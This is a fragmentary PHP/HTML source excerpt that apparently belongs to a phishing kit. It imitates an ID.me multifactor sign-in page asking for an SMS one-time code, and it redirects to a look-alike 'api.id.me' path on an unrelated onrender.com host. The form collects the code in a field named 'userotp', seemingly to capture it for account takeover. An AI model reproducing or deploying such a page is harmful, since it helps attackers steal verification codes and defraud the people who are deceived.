...
header("Location:https://upstart-loans-728b.onrender.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
exit;
}
?>
...
<head>
    ...
    <meta name="csrf-token"
        content="TMnpg+ITTx0b5J+SyeKXWnsyV3AcUZX3fTD1H+3IUhyNEJtkGQGpgsG7rcpV/E1IfbNganyU9Q31o6+SH9zRJZw==" />
                    ...
                    <form method="post" action="" accept-charset="UTF-8" data-validate="">
                        ...
                        <div class="form-content">
                            ...
                            <p>Please check your phone and enter the 6-digit code sent via sms to complete your sign in.
                                It might take a minute or two for the code to arrive, please be patient.</p>
                        </div>
                        ...
                        <div class="form-fields">
                            <div class="field text m_code">
                                ...
                                <input maxlength="6" pattern="[0-9]*" placeholder="______" required="required"
                                    autocomplete="one-time-code" size="6" type="text" name="userotp"
                                    id="multifactor_code">
                                <span role="alert">
